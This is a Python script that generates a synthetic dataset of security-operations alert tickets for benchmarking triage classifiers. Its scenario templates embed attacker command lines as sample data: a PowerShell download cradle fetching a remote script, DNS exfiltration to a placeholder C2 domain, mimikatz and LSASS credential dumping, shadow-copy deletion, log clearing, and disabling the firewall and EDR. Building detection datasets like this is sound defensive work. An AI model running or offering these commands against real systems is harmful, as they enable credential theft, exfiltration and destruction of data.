"""
Synthetic ticket generator v2 — for the 7-model comparison harness only.

Why this exists: the original generator (backend/scripts/generate_tickets.py)
uses 15 templates where each template has ONE fixed label. That means
rule_triggered alone perfectly predicts the label, so all 9 non-rule
engineered features (severity, user_type, hour_of_day, is_weekend,
historical_tp_count, historical_fp_count, mitre_tactic_encoded,
is_external_ip, is_known_tool, target_is_dc) do zero work, and every model in
a comparison would land at ~99%+ accuracy and look identical.

This version:
  - Uses ~45 scenario templates, each with a BASE label-probability
    distribution (not a fixed label) covering more MITRE ATT&CK techniques.
  - Generates historical_tp_count / historical_fp_count and other features
    FIRST, independently and noisily (not derived from the label).
  - Then adjusts the template's base probabilities using those generated
    feature values (history, user_type, severity, is_known_tool,
    target_is_dc, is_external_ip, hour_of_day, day_of_week) and samples the
    final label from the adjusted distribution. This makes the label a
    genuine function of feature combinations, with real class overlap.
  - Uses rejection sampling per-class to hit an exact global target
    distribution (~55% FP / 25% TP / 20% NEEDS_REVIEW) without ever
    overwriting a sampled label after the fact.

Schema matches backend/data/tickets_100.ndjson exactly:
  ticket_id, severity, status, created_time, rule_triggered, mitre_attack,
  user, user_type, source_asset, source_ip, target_asset, target_ip,
  process, command_line, decoded_command, hour_of_day, day_of_week,
  historical_tp_count, historical_fp_count, label

Run (from backend/):
    python -m model_comparison.generate_tickets_v2
Output:
    model_comparison/data/tickets_{TOTAL_ROWS}.ndjson
"""

import json
import os
import random
import sys
from datetime import datetime, timedelta

sys.path.insert(0, os.path.dirname(os.path.dirname(os.path.abspath(__file__))))

from pipeline.classifier import KNOWN_MALICIOUS_TOOLS, INTERNAL_RANGES  # noqa: E402

random.seed(7)

DAYS = ["Monday", "Tuesday", "Wednesday", "Thursday", "Friday", "Saturday", "Sunday"]
LABELS = ["TRUE_POSITIVE", "FALSE_POSITIVE", "NEEDS_REVIEW"]

TOTAL_ROWS = 10000
TARGET_RATIO = {"FALSE_POSITIVE": 0.55, "TRUE_POSITIVE": 0.25, "NEEDS_REVIEW": 0.20}

INTERNAL_SUBNETS = ["10.10.1.", "10.10.2.", "10.10.3.", "10.20.1.", "10.20.2.",
                    "172.16.5.", "172.16.6.", "192.168.1.", "192.168.2."]
EXTERNAL_IPS = ["45.76.123.88", "195.88.54.212", "8.8.8.8", "203.0.113.10", "91.219.237.5",
                "103.224.182.19", "185.220.101.4", "198.51.100.23", "141.98.11.5"]

USER_POOL = {
    "service_account": ["SVC-AnsibleDeploy", "SVC-BackupAgent", "SVC-SCCM", "SVC-Monitoring",
                        "SVC-Splunk", "SVC-Patching", "SVC-Veeam", "SVC-SqlAgent",
                        "aws-svc-account@corp.com", "azure-automation@corp.com"],
    "standard_user": ["j.smith", "m.johnson", "l.davis", "t.taylor", "p.moore", "k.wilson",
                      "s.anderson", "a.williams", "bwilliams", "r.chen", "d.patel", "n.brown"],
    "admin_user": ["agarcia", "tadmin", "sysadmin", "admin.garcia", "Administrator",
                  "domain-admin", "netops-admin", "s.kumar-admin"],
}

SOURCE_ASSETS = ["MGMT-SRV-01", "BACKUP-SRV-02", "SCCM-SRV-01", "MON-SRV-01", "DESK-PC-089",
                 "DESK-PC-112", "AZURE-GATEWAY", "DB-SRV-03", "VPN-GW-01", "ADMIN-WS-03",
                 "LAPTOP-441", "LAPTOP-207", "JUMP-BOX-01", "CI-RUNNER-02", "MAIL-SRV-01"]
TARGET_ASSETS = ["APP-SRV-07", "FILE-SRV-01", "DESK-PC-144", "DC-01", "DC-02", "VPN-GW-01",
                 "EXTERNAL-DNS", "CORP-INTRANET", "SQL-SRV-04", "WEB-SRV-02", "HR-SHARE-01",
                 "FINANCE-SRV-01", "BACKUP-NAS-01"]

# ---------------------------------------------------------------------------
# Templates: (rule, mitre, process, cmd_tpl, decoded_tpl,
#             severity_pool, user_type_pool, base_weights={TP, FP, NR})
# Weights are a PRIOR, not a verdict — final label is sampled after feature
# adjustment below. Many templates deliberately straddle two classes.
# ---------------------------------------------------------------------------
TEMPLATES = [
    ("PowerShell Encoded Command Execution", "T1059.001", "powershell.exe",
     "powershell.exe -EncodedCommand {b64}", "w32tm.exe /query /status",
     ["MEDIUM", "HIGH"], ["service_account", "admin_user"], {"TRUE_POSITIVE": 0.30, "FALSE_POSITIVE": 0.55, "NEEDS_REVIEW": 0.15}),
    ("PowerShell Download Cradle", "T1059.001", "powershell.exe",
     "powershell.exe -nop -w hidden -c IEX(New-Object Net.WebClient).DownloadString('{url}')",
     "Remote script download and in-memory execution", ["HIGH", "CRITICAL"], ["standard_user"],
     {"TRUE_POSITIVE": 0.60, "FALSE_POSITIVE": 0.20, "NEEDS_REVIEW": 0.20}),
    ("Scheduled Task Created via Schtasks", "T1053.005", "schtasks.exe",
     'schtasks /create /tn "{task}" /tr "C:\\ops\\run.bat" /sc daily',
     'schtasks /create /tn "{task}" /tr "C:\\ops\\run.bat" /sc daily',
     ["LOW", "MEDIUM"], ["service_account"], {"TRUE_POSITIVE": 0.10, "FALSE_POSITIVE": 0.75, "NEEDS_REVIEW": 0.15}),
    ("Scheduled Task Created by Non-Admin User", "T1053.005", "schtasks.exe",
     'schtasks /create /tn "{task}" /tr "powershell -enc {b64}" /sc onlogon',
     "Scheduled task set to run encoded PowerShell at logon", ["MEDIUM", "HIGH"], ["standard_user"],
     {"TRUE_POSITIVE": 0.45, "FALSE_POSITIVE": 0.30, "NEEDS_REVIEW": 0.25}),
    ("WMI Remote Execution Detected", "T1047", "wmiprvse.exe",
     "wmic /node:{ip} process call create 'cmd /c gpupdate /force'",
     "wmic /node:{ip} process call create 'cmd /c gpupdate /force'",
     ["MEDIUM", "HIGH"], ["service_account"], {"TRUE_POSITIVE": 0.25, "FALSE_POSITIVE": 0.55, "NEEDS_REVIEW": 0.20}),
    ("WMI Lateral Execution to Multiple Hosts", "T1047", "wmiprvse.exe",
     "wmic /node:{ip} process call create 'cmd /c whoami & net view'",
     "WMI execution against multiple hosts within short window", ["HIGH", "CRITICAL"], ["standard_user", "admin_user"],
     {"TRUE_POSITIVE": 0.55, "FALSE_POSITIVE": 0.20, "NEEDS_REVIEW": 0.25}),
    ("Net User Account Enumeration", "T1087.001", "net.exe",
     "net user /domain", "net user /domain", ["LOW", "MEDIUM"], ["service_account", "standard_user"],
     {"TRUE_POSITIVE": 0.15, "FALSE_POSITIVE": 0.65, "NEEDS_REVIEW": 0.20}),
    ("Local Admin Group Enumeration", "T1087.001", "net.exe",
     "net localgroup administrators", "Enumeration of local administrators group",
     ["MEDIUM", "HIGH"], ["standard_user"], {"TRUE_POSITIVE": 0.40, "FALSE_POSITIVE": 0.35, "NEEDS_REVIEW": 0.25}),
    ("Admin Script Execution Outside Business Hours", "T1059.001", "powershell.exe",
     "powershell.exe -ExecutionPolicy Bypass -File C:\\admin\\scripts\\routine_maint.ps1",
     "Routine maintenance script executed by scheduled job", ["MEDIUM", "HIGH"], ["admin_user"],
     {"TRUE_POSITIVE": 0.20, "FALSE_POSITIVE": 0.60, "NEEDS_REVIEW": 0.20}),
    ("Privileged Command Execution by Admin Account", "T1078", "cmd.exe",
     "cmd.exe /c robocopy /MIR /Z", "Known IT admin performing scheduled mirror job",
     ["LOW", "MEDIUM"], ["admin_user"], {"TRUE_POSITIVE": 0.10, "FALSE_POSITIVE": 0.75, "NEEDS_REVIEW": 0.15}),
    ("Mimikatz LSASS Credential Dumping", "T1003.001", "mimikatz.exe",
     "mimikatz.exe privilege::debug sekurlsa::logonpasswords exit",
     "mimikatz.exe privilege::debug sekurlsa::logonpasswords exit",
     ["CRITICAL"], ["standard_user", "admin_user"], {"TRUE_POSITIVE": 0.75, "FALSE_POSITIVE": 0.05, "NEEDS_REVIEW": 0.20}),
    ("LSASS Memory Access via Rundll32", "T1003.001", "rundll32.exe",
     "rundll32.exe comsvcs.dll MiniDump {pid} lsass.dmp full",
     "Process memory dump of lsass.exe via rundll32", ["HIGH", "CRITICAL"], ["standard_user"],
     {"TRUE_POSITIVE": 0.65, "FALSE_POSITIVE": 0.15, "NEEDS_REVIEW": 0.20}),
    ("Ransomware File Extension Mass Rename", "T1486", "explorer.exe",
     "explorer.exe [mass rename .docx -> .locked detected via file system monitor]",
     "Mass file encryption event: files renamed to .locked",
     ["CRITICAL"], ["standard_user"], {"TRUE_POSITIVE": 0.80, "FALSE_POSITIVE": 0.05, "NEEDS_REVIEW": 0.15}),
    ("Volume Shadow Copy Deletion", "T1490", "vssadmin.exe",
     "vssadmin.exe delete shadows /all /quiet", "Shadow copy deletion — common ransomware precursor",
     ["CRITICAL"], ["standard_user", "admin_user"], {"TRUE_POSITIVE": 0.70, "FALSE_POSITIVE": 0.10, "NEEDS_REVIEW": 0.20}),
    ("Impossible Travel Login Detected", "T1078", "lsass.exe",
     "Authentication from {ip} 42 mins after auth from internal IP",
     "Impossible travel: physical travel impossible in elapsed time",
     ["HIGH", "CRITICAL"], ["admin_user", "standard_user"], {"TRUE_POSITIVE": 0.55, "FALSE_POSITIVE": 0.20, "NEEDS_REVIEW": 0.25}),
    ("Large Volume Data Exfiltration via DNS", "T1048.003", "nslookup.exe",
     "nslookup {b64}.evil-c2.io 8.8.8.8",
     "Data exfiltration via DNS tunneling: several GB transferred to external C2",
     ["CRITICAL"], ["service_account", "standard_user"], {"TRUE_POSITIVE": 0.65, "FALSE_POSITIVE": 0.15, "NEEDS_REVIEW": 0.20}),
    ("Cobalt Strike Beacon Detected", "T1059.003", "rundll32.exe",
     "rundll32.exe cobalt_beacon.dll,StartBeacon", "Cobalt Strike beacon callback to known C2 infrastructure",
     ["CRITICAL"], ["standard_user"], {"TRUE_POSITIVE": 0.80, "FALSE_POSITIVE": 0.05, "NEEDS_REVIEW": 0.15}),
    ("Pass-the-Hash Lateral Movement", "T1003", "psexec.exe",
     "psexec.exe \\\\{ip} -u admin -p hash cmd.exe", "Pass-the-hash lateral movement detected via psexec",
     ["CRITICAL"], ["standard_user", "admin_user"], {"TRUE_POSITIVE": 0.65, "FALSE_POSITIVE": 0.15, "NEEDS_REVIEW": 0.20}),
    ("PsExec Remote Execution", "T1021.002", "psexec.exe",
     "psexec.exe \\\\{ip} -s cmd.exe /c ipconfig /all", "Remote command execution via PsExec — common in both admin and attacker use",
     ["MEDIUM", "HIGH"], ["admin_user", "service_account"], {"TRUE_POSITIVE": 0.35, "FALSE_POSITIVE": 0.45, "NEEDS_REVIEW": 0.20}),
    ("VPN Login from Unusual Country", "T1078", "lsass.exe",
     "VPN authentication from {ip} — user normally authenticates from US",
     "Login from unusual country. Travel not confirmed in HR system.",
     ["MEDIUM", "HIGH"], ["standard_user"], {"TRUE_POSITIVE": 0.35, "FALSE_POSITIVE": 0.25, "NEEDS_REVIEW": 0.40}),
    ("Bulk Password Reset Outside Business Hours", "T1098", "powershell.exe",
     "powershell.exe -File bulk_user_reset.ps1 -Force",
     "Bulk password reset script executed at night — no change ticket found",
     ["HIGH"], ["admin_user"], {"TRUE_POSITIVE": 0.35, "FALSE_POSITIVE": 0.25, "NEEDS_REVIEW": 0.40}),
    ("Unusual Process Spawned by Office Document", "T1059.005", "winword.exe",
     "winword.exe -> cmd.exe -> powershell.exe -nop -w hidden",
     "Office macro spawned suspicious child process chain, intent unclear",
     ["MEDIUM", "HIGH"], ["standard_user"], {"TRUE_POSITIVE": 0.45, "FALSE_POSITIVE": 0.20, "NEEDS_REVIEW": 0.35}),
    ("Suspicious Outbound Beacon-like Traffic", "T1071.001", "svchost.exe",
     "svchost.exe periodic HTTPS beacon to {ip} every 60s",
     "Regular-interval outbound connection pattern consistent with C2 beaconing",
     ["MEDIUM", "HIGH"], ["service_account", "standard_user"], {"TRUE_POSITIVE": 0.40, "FALSE_POSITIVE": 0.35, "NEEDS_REVIEW": 0.25}),
    ("New Local Administrator Account Created", "T1136", "net.exe",
     "net user backupsvc2 P@ss1234 /add && net localgroup administrators backupsvc2 /add",
     "New local admin account created outside change window",
     ["HIGH", "CRITICAL"], ["admin_user", "standard_user"], {"TRUE_POSITIVE": 0.50, "FALSE_POSITIVE": 0.25, "NEEDS_REVIEW": 0.25}),
    ("Registry Run Key Persistence", "T1547.001", "reg.exe",
     "reg add HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run /v Updater /t REG_SZ /d C:\\tmp\\upd.exe",
     "Persistence entry added to registry Run key", ["MEDIUM", "HIGH"], ["standard_user"],
     {"TRUE_POSITIVE": 0.45, "FALSE_POSITIVE": 0.30, "NEEDS_REVIEW": 0.25}),
    ("Log Clearing Detected", "T1070.004", "wevtutil.exe",
     "wevtutil.exe cl Security", "Security event log cleared", ["HIGH", "CRITICAL"],
     ["standard_user", "admin_user"], {"TRUE_POSITIVE": 0.60, "FALSE_POSITIVE": 0.15, "NEEDS_REVIEW": 0.25}),
    ("Obfuscated Script Content Detected", "T1027", "powershell.exe",
     "powershell.exe -e {b64}", "Base64 / obfuscated script body flagged by content inspection",
     ["MEDIUM", "HIGH"], ["standard_user", "service_account"], {"TRUE_POSITIVE": 0.35, "FALSE_POSITIVE": 0.40, "NEEDS_REVIEW": 0.25}),
    ("Suspicious Macro Enabled Document Opened", "T1204.002", "winword.exe",
     "winword.exe opened macro-enabled attachment from external sender",
     "User enabled macros on an email attachment from an external domain",
     ["MEDIUM", "HIGH"], ["standard_user"], {"TRUE_POSITIVE": 0.40, "FALSE_POSITIVE": 0.30, "NEEDS_REVIEW": 0.30}),
    ("Phishing Link Clicked — Credential Harvest Page", "T1566.001", "chrome.exe",
     "chrome.exe navigated to {url} matching known phishing kit signature",
     "User clicked link to page matching known credential-harvesting kit",
     ["HIGH", "CRITICAL"], ["standard_user"], {"TRUE_POSITIVE": 0.55, "FALSE_POSITIVE": 0.15, "NEEDS_REVIEW": 0.30}),
    ("Repeated Failed Logins Followed by Success", "T1110", "lsass.exe",
     "12 failed authentications followed by success for {user}",
     "Password spray pattern followed by successful authentication",
     ["HIGH", "CRITICAL"], ["standard_user", "service_account"], {"TRUE_POSITIVE": 0.50, "FALSE_POSITIVE": 0.25, "NEEDS_REVIEW": 0.25}),
    ("Credentials Found in Plaintext Config File", "T1552.001", "findstr.exe",
     "findstr /si password *.config *.xml *.txt", "Scan for plaintext credentials in config files",
     ["MEDIUM", "HIGH"], ["standard_user"], {"TRUE_POSITIVE": 0.40, "FALSE_POSITIVE": 0.35, "NEEDS_REVIEW": 0.25}),
    ("Screensaver Registry Modification (Persistence)", "T1546.002", "reg.exe",
     "reg add HKCU\\Control Panel\\Desktop /v SCRNSAVE.EXE /d C:\\tmp\\payload.scr",
     "Screensaver executable path repointed to non-standard binary",
     ["MEDIUM", "HIGH"], ["standard_user"], {"TRUE_POSITIVE": 0.45, "FALSE_POSITIVE": 0.30, "NEEDS_REVIEW": 0.25}),
    ("System Information Discovery", "T1082", "systeminfo.exe",
     "systeminfo.exe", "Routine or reconnaissance system information query",
     ["LOW", "MEDIUM"], ["service_account", "standard_user"], {"TRUE_POSITIVE": 0.15, "FALSE_POSITIVE": 0.65, "NEEDS_REVIEW": 0.20}),
    ("Network Configuration Discovery", "T1016", "ipconfig.exe",
     "ipconfig /all", "Routine or reconnaissance network config query",
     ["LOW", "MEDIUM"], ["service_account", "standard_user"], {"TRUE_POSITIVE": 0.10, "FALSE_POSITIVE": 0.75, "NEEDS_REVIEW": 0.15}),
    ("Account Discovery via PowerShell", "T1087.001", "powershell.exe",
     "powershell.exe Get-ADUser -Filter * -Properties *",
     "Bulk Active Directory user attribute enumeration",
     ["MEDIUM", "HIGH"], ["standard_user", "admin_user"], {"TRUE_POSITIVE": 0.40, "FALSE_POSITIVE": 0.35, "NEEDS_REVIEW": 0.25}),
    ("Permission Group Discovery", "T1069", "net.exe",
     "net group \"Domain Admins\" /domain", "Enumeration of privileged AD groups",
     ["MEDIUM", "HIGH"], ["standard_user"], {"TRUE_POSITIVE": 0.40, "FALSE_POSITIVE": 0.35, "NEEDS_REVIEW": 0.25}),
    ("Remote System Discovery Sweep", "T1018", "ping.exe",
     "for /L %i in (1,1,254) do ping -n 1 10.10.1.%i", "Sequential internal subnet sweep",
     ["MEDIUM", "HIGH"], ["standard_user", "service_account"], {"TRUE_POSITIVE": 0.45, "FALSE_POSITIVE": 0.30, "NEEDS_REVIEW": 0.25}),
    ("SMB Share Enumeration", "T1135", "net.exe",
     "net view \\\\{ip} /all", "Enumeration of SMB shares on remote host",
     ["MEDIUM", "HIGH"], ["standard_user", "service_account"], {"TRUE_POSITIVE": 0.35, "FALSE_POSITIVE": 0.40, "NEEDS_REVIEW": 0.25}),
    ("Scheduled Task Renamed to Mimic System Task", "T1053.005", "schtasks.exe",
     'schtasks /create /tn "Microsoft\\Windows\\WindowsUpdate\\AutoRefresh" /tr "powershell -enc {b64}"',
     "Scheduled task created with name mimicking a built-in Windows task",
     ["HIGH", "CRITICAL"], ["standard_user"], {"TRUE_POSITIVE": 0.65, "FALSE_POSITIVE": 0.15, "NEEDS_REVIEW": 0.20}),
    ("Rare Parent-Child Process Relationship", "T1055", "svchost.exe",
     "svchost.exe -> cmd.exe -> powershell.exe -nop -enc {b64}",
     "Uncommon process ancestry chain flagged by EDR behavioral rule",
     ["MEDIUM", "HIGH"], ["standard_user"], {"TRUE_POSITIVE": 0.45, "FALSE_POSITIVE": 0.30, "NEEDS_REVIEW": 0.25}),
    ("Archive Utility Staging Large Files", "T1560", "7z.exe",
     "7z.exe a -pP@ss archive.7z C:\\Users\\{user}\\Documents\\*",
     "Password-protected archive of user documents staged prior to transfer",
     ["MEDIUM", "HIGH"], ["standard_user"], {"TRUE_POSITIVE": 0.45, "FALSE_POSITIVE": 0.30, "NEEDS_REVIEW": 0.25}),
    ("Email Forwarding Rule Created to External Address", "T1114.003", "outlook.exe",
     "New inbox rule: forward all mail to external.address@gmail.com",
     "Auto-forwarding rule created pointing to external personal email",
     ["HIGH", "CRITICAL"], ["standard_user"], {"TRUE_POSITIVE": 0.55, "FALSE_POSITIVE": 0.20, "NEEDS_REVIEW": 0.25}),
    ("Cloud Storage Sync of Sensitive Share", "T1567.002", "dropbox.exe",
     "dropbox.exe sync started for \\\\FINANCE-SRV-01\\confidential",
     "Personal cloud-sync client observed syncing a sensitive network share",
     ["MEDIUM", "HIGH"], ["standard_user"], {"TRUE_POSITIVE": 0.40, "FALSE_POSITIVE": 0.35, "NEEDS_REVIEW": 0.25}),
    ("Firewall Rule Disabled by Script", "T1562.004", "netsh.exe",
     "netsh advfirewall set allprofiles state off", "Host firewall disabled via script/command",
     ["HIGH", "CRITICAL"], ["standard_user", "admin_user"], {"TRUE_POSITIVE": 0.55, "FALSE_POSITIVE": 0.20, "NEEDS_REVIEW": 0.25}),
    ("Security Tooling Process Terminated", "T1562.001", "taskkill.exe",
     "taskkill /IM edr_agent.exe /F", "Endpoint security agent process terminated",
     ["CRITICAL"], ["standard_user", "admin_user"], {"TRUE_POSITIVE": 0.70, "FALSE_POSITIVE": 0.10, "NEEDS_REVIEW": 0.20}),
    ("Unrecognized Scheduled Backup Job", "T1053.005", "schtasks.exe",
     'schtasks /create /tn "WeeklyOffsiteSync" /tr "robocopy D:\\data \\\\BACKUP-NAS-01\\sync /MIR" /sc weekly',
     "New backup automation task registered by infrastructure team",
     ["LOW", "MEDIUM"], ["service_account", "admin_user"], {"TRUE_POSITIVE": 0.10, "FALSE_POSITIVE": 0.75, "NEEDS_REVIEW": 0.15}),
    ("Routine Patch Management Script", "T1059.001", "powershell.exe",
     "powershell.exe -File C:\\patchmgmt\\deploy_kb.ps1", "Scheduled patch deployment via management platform",
     ["LOW", "MEDIUM"], ["service_account"], {"TRUE_POSITIVE": 0.05, "FALSE_POSITIVE": 0.85, "NEEDS_REVIEW": 0.10}),
]

assert len(TEMPLATES) >= 40, f"expected >=40 templates, have {len(TEMPLATES)}"


def _random_internal_ip():
    return random.choice(INTERNAL_SUBNETS) + str(random.randint(2, 250))


def _fill(tpl: str, ip: str, user: str) -> str:
    if "{ip}" in tpl:
        tpl = tpl.replace("{ip}", ip)
    if "{b64}" in tpl:
        tpl = tpl.replace("{b64}", "JABzAD0AJwBXAGkAbgBkAG8AdwBzAFQAaQBtAGUAJwA7" + str(random.randint(1000, 9999)))
    if "{url}" in tpl:
        tpl = tpl.replace("{url}", random.choice(["http://cdn-update-check.net/i.ps1", "http://185.220.101.4/x.php"]))
    if "{task}" in tpl:
        tpl = tpl.replace("{task}", random.choice(["NightlyBackup", "SyncJob", "MaintWindow", "AutoUpdate"]))
    if "{pid}" in tpl:
        tpl = tpl.replace("{pid}", str(random.randint(400, 900)))
    if "{user}" in tpl:
        tpl = tpl.replace("{user}", user)
    return tpl


def _is_known_tool(process: str, command_line: str) -> bool:
    combined = (process + " " + command_line).lower()
    return any(tool in combined for tool in KNOWN_MALICIOUS_TOOLS)


def _is_external_ip(ip: str) -> bool:
    return not any(ip.startswith(r) for r in INTERNAL_RANGES)


def _target_is_dc(target_asset: str) -> bool:
    a = target_asset.lower()
    return "dc-" in a or "dc0" in a


def _sample_history(base_weights: dict) -> tuple[int, int]:
    """
    Generate historical_tp_count / historical_fp_count FIRST, as noisy priors
    loosely informed by the template's base tendency — NOT derived from the
    eventual sampled label. This is what lets history genuinely predict
    (not just correlate with) the label sampled afterward.
    """
    fp_lean = base_weights["FALSE_POSITIVE"]
    tp_lean = base_weights["TRUE_POSITIVE"]

    hist_fp = int(random.gammavariate(2.0, 4.0) * (0.3 + fp_lean))
    hist_tp = int(random.gammavariate(1.6, 1.8) * (0.3 + tp_lean))

    hist_fp = min(hist_fp, 60)
    hist_tp = min(hist_tp, 15)
    return hist_tp, hist_fp


def _adjust_weights(base: dict, *, hist_tp: int, hist_fp: int, user_type: str,
                     severity: str, is_known_tool: bool, target_is_dc: bool,
                     is_external: bool, hour_of_day: int, is_weekend: bool,
                     sharpen: bool = False) -> dict:
    # Blend the template's base prior toward uniform before applying feature
    # adjustments. Without this, the template identity alone (proxy for
    # rule_triggered) still dominates the final label and the other 9
    # features contribute almost nothing on top of it. Blending forces a
    # meaningful share of the final decision to come from the adjustments
    # below, i.e. from historical counts / user_type / severity / known-tool
    # / DC-target / external-ip / time-of-day — matching how real SOC triage
    # actually reasons (rule type is a starting point, not the verdict).
    uniform = 1.0 / len(LABELS)
    w = {k: 0.45 * v + 0.55 * uniform for k, v in base.items()}

    # historical signal — the single strongest adjustment, deliberately
    fp_pressure = min(hist_fp / 25.0, 2.4)
    tp_pressure = min(hist_tp / 5.0, 2.4)
    w["FALSE_POSITIVE"] *= (1.0 + 2.4 * fp_pressure)
    w["TRUE_POSITIVE"] *= (1.0 + 2.4 * tp_pressure)
    w["NEEDS_REVIEW"] *= (1.0 + 0.4 * fp_pressure)

    # Mixed-history signal: a genuine, dedicated trigger for NEEDS_REVIEW,
    # rather than it only ever being "whatever's left over" between TP and
    # FP. A rule with a real mixed track record on THIS entity (some past
    # true positives AND some past false positives, in comparable amounts)
    # is exactly the case a real analyst would flag for a second look rather
    # than auto-closing or auto-escalating — so it should be learnable as
    # its own condition, not just diluted ambiguity.
    if hist_tp >= 1 and hist_fp >= 3:
        # how close the two counts are in proportion (0 = wildly lopsided, 1 = perfectly balanced)
        ratio_balance = 1.0 - min(abs(hist_tp * 5 - hist_fp) / 25.0, 1.0)
        if ratio_balance > 0.4:
            w["NEEDS_REVIEW"] *= (1.0 + 2.0 * ratio_balance)

    # service accounts running routine-looking things skew FP, unless a known
    # malicious tool or DC target overrides that
    if user_type == "service_account" and not is_known_tool and not target_is_dc:
        w["FALSE_POSITIVE"] *= 1.7
        w["TRUE_POSITIVE"] *= 0.55
    elif user_type == "admin_user" and not is_known_tool:
        w["FALSE_POSITIVE"] *= 1.25

    if severity == "CRITICAL":
        w["TRUE_POSITIVE"] *= 2.0
        w["FALSE_POSITIVE"] *= 0.45
    elif severity == "HIGH":
        w["TRUE_POSITIVE"] *= 1.3
        w["FALSE_POSITIVE"] *= 0.8
    elif severity == "LOW":
        w["FALSE_POSITIVE"] *= 1.9
        w["TRUE_POSITIVE"] *= 0.4

    if is_known_tool:
        w["TRUE_POSITIVE"] *= 3.2
        w["FALSE_POSITIVE"] *= 0.2

    if target_is_dc:
        w["TRUE_POSITIVE"] *= 2.3
        w["NEEDS_REVIEW"] *= 1.3
        w["FALSE_POSITIVE"] *= 0.55

    if is_external:
        w["TRUE_POSITIVE"] *= 1.9
        w["NEEDS_REVIEW"] *= 1.2
        w["FALSE_POSITIVE"] *= 0.7

    if hour_of_day < 6 or hour_of_day >= 22:
        w["TRUE_POSITIVE"] *= 1.6
        w["NEEDS_REVIEW"] *= 1.2
        w["FALSE_POSITIVE"] *= 0.7
    if is_weekend:
        w["TRUE_POSITIVE"] *= 1.45
        w["NEEDS_REVIEW"] *= 1.2
        w["FALSE_POSITIVE"] *= 0.75

    total = sum(w.values())
    w = {k: v / total for k, v in w.items()}

    # Clarity tier: real SOC alert populations aren't uniformly
    # medium-confidence — a majority are fairly clear-cut, a genuine
    # minority are truly ambiguous. Without this, every ticket goes through
    # the identical adjustment recipe and lands in a narrow ~40-60% "medium
    # confidence" band, which caps every model at nearly the same ceiling
    # regardless of algorithm. Squaring-and-renormalizing sharpens whichever
    # class the adjustments above already favor (it does not change WHICH
    # class is favored, only how confidently) — applied to ~60% of tickets;
    # the remaining ~40% stay exactly as ambiguous as before.
    if sharpen:
        squared = {k: v ** 2 for k, v in w.items()}
        sq_total = sum(squared.values())
        w = {k: v / sq_total for k, v in squared.items()}

    return w


def _gen_candidate(i: int) -> dict:
    (rule, mitre, process, cmd_tpl, decoded_tpl, sev_pool, user_type_pool, base_weights) = random.choice(TEMPLATES)

    user_type = random.choice(user_type_pool)
    user = random.choice(USER_POOL[user_type])
    severity = random.choice(sev_pool)

    external = random.random() < 0.28
    target_ip = random.choice(EXTERNAL_IPS) if external else _random_internal_ip()
    source_ip = _random_internal_ip()
    command_line = _fill(cmd_tpl, target_ip, user)
    decoded_command = _fill(decoded_tpl, target_ip, user)

    created = datetime(2026, 1, 1) + timedelta(
        days=random.randint(0, 179), hours=random.randint(0, 23), minutes=random.randint(0, 59)
    )
    is_weekend = created.weekday() >= 5

    target_asset = random.choice(TARGET_ASSETS)
    if random.random() < 0.12:
        target_asset = random.choice(["DC-01", "DC-02"])

    hist_tp, hist_fp = _sample_history(base_weights)

    known_tool = _is_known_tool(process, command_line)
    ext_ip_flag = _is_external_ip(target_ip)
    dc_flag = _target_is_dc(target_asset)

    sharpen = random.random() < 0.6  # ~60% "clear" tickets, ~40% genuinely ambiguous

    final_weights = _adjust_weights(
        base_weights,
        hist_tp=hist_tp, hist_fp=hist_fp, user_type=user_type, severity=severity,
        is_known_tool=known_tool, target_is_dc=dc_flag, is_external=ext_ip_flag,
        hour_of_day=created.hour, is_weekend=is_weekend, sharpen=sharpen,
    )
    label = random.choices(LABELS, weights=[final_weights[l] for l in LABELS])[0]

    return {
        "ticket_id": f"INC-2026-{10000 + i}",
        "severity": severity,
        "status": "OPEN",
        "created_time": created.strftime("%Y-%m-%dT%H:%M:%SZ"),
        "rule_triggered": rule,
        "mitre_attack": mitre,
        "user": user,
        "user_type": user_type,
        "source_asset": random.choice(SOURCE_ASSETS),
        "source_ip": source_ip,
        "target_asset": target_asset,
        "target_ip": target_ip,
        "process": process,
        "command_line": command_line,
        "decoded_command": decoded_command,
        "hour_of_day": created.hour,
        "day_of_week": DAYS[created.weekday()],
        "historical_tp_count": hist_tp,
        "historical_fp_count": hist_fp,
        "label": label,
    }


def generate(total: int = TOTAL_ROWS) -> list[dict]:
    quotas = {k: round(v * total) for k, v in TARGET_RATIO.items()}
    # fix rounding drift so quotas sum exactly to total
    drift = total - sum(quotas.values())
    quotas["FALSE_POSITIVE"] += drift

    tickets: list[dict] = []
    counts = {k: 0 for k in LABELS}
    i = 0
    max_attempts = total * 200  # safety valve, should never be hit in practice
    attempts = 0

    while sum(counts.values()) < total and attempts < max_attempts:
        attempts += 1
        candidate = _gen_candidate(i)
        label = candidate["label"]
        if counts[label] >= quotas[label]:
            continue  # this class's quota is full, discard and resample
        counts[label] += 1
        i += 1
        tickets.append(candidate)

    if sum(counts.values()) < total:
        raise RuntimeError(
            f"Could not fill quotas after {attempts} attempts. "
            f"Got {counts}, needed {quotas}. Template weights may need adjustment."
        )

    random.shuffle(tickets)
    return tickets


def _rule_only_baseline_check(tickets: list[dict]) -> float:
    """
    Sanity check (deliverable 5): train a shallow decision tree on
    rule_triggered ALONE. If this scores ~95%+, the label-ambiguity
    injection didn't work — rule_triggered is still a near-perfect predictor.
    """
    from sklearn.model_selection import cross_val_score, StratifiedKFold
    from sklearn.preprocessing import LabelEncoder
    from sklearn.tree import DecisionTreeClassifier

    rule_enc = LabelEncoder()
    label_enc = LabelEncoder()
    X = rule_enc.fit_transform([t["rule_triggered"] for t in tickets]).reshape(-1, 1)
    y = label_enc.fit_transform([t["label"] for t in tickets])

    clf = DecisionTreeClassifier(max_depth=6, random_state=42)
    cv = StratifiedKFold(n_splits=5, shuffle=True, random_state=42)
    scores = cross_val_score(clf, X, y, cv=cv, scoring="accuracy")
    return float(scores.mean())


def main():
    print("=" * 70)
    print("SOC Triage — Synthetic Ticket Generator v2 (model-comparison dataset)")
    print("=" * 70)

    tickets = generate(TOTAL_ROWS)

    out_dir = os.path.join(os.path.dirname(os.path.abspath(__file__)), "data")
    os.makedirs(out_dir, exist_ok=True)
    out_path = os.path.join(out_dir, f"tickets_{TOTAL_ROWS}.ndjson")
    with open(out_path, "w") as f:
        for t in tickets:
            f.write(json.dumps(t) + "\n")

    print(f"\nWrote {len(tickets)} tickets to {out_path}")
    print(f"Templates used: {len(TEMPLATES)}")

    print("\nLabel distribution:")
    total = len(tickets)
    for label in LABELS:
        count = sum(1 for t in tickets if t["label"] == label)
        print(f"  {label:20s}: {count:5d}  ({count / total:.1%})")

